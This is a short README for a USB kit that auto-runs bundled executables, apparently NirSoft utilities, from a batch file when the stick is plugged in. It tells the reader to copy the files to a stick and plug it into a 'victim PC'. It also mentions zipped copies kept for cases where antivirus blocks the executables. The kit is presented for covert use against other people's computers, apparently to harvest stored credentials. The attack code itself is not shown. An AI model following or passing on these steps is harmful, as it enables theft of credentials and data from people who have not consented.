Decompress everything in the same folder.

The 'Autorun' folder contains the .bat for starting the programs automatically when you plug the USB
The 'Source' folder contains all the .exes for this method
The 'Zip Root' folder contains all the .exes in .zip version in case one of those doesn't work because of the antivirus
-You can also download them again from here: https://www.nirsoft.net/

1- Get an USB stick (storage doesn't matter as this requires only a few MB)
2- Copy all the files in 'Autorun' and 'Source' to the USB stick
3- Unplug and plug into your victim PC ;)
